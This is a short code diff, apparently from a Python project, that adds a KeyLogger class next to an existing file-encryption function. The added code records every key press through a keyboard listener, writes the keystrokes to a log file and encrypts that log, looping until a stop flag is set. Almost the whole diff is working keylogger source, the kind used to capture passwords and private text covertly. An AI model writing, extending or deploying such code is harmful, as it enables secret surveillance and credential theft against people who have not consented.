@@ -85,3 +85,25 @@ def encrypt_file(file_name, key):
             encrypted_file.write(encrypted)
     except Exception as e:
         print(f"Error encrypting file {file_name}: {e}")
+
+class KeyLogger:
+    def __init__(self, log_file, key):
+        self.log_file = log_file
+        self.key = key
+        self.keys = []
+
+    def on_press(self, key):
+        self.keys.append(str(key).replace("'", ""))
+        self.write_file()
+
+    def write_file(self):
+        with open(self.log_file, "a") as f:
+            for key in self.keys:
+                f.write(f"{key}\n")
+        self.keys = []
+        encrypt_file(self.log_file, self.key)
+
+    def start(self):
+        with KeyListener(on_press=self.on_press) as listener:
+            while not stop_threads:
+                listener.join(timeout=1)
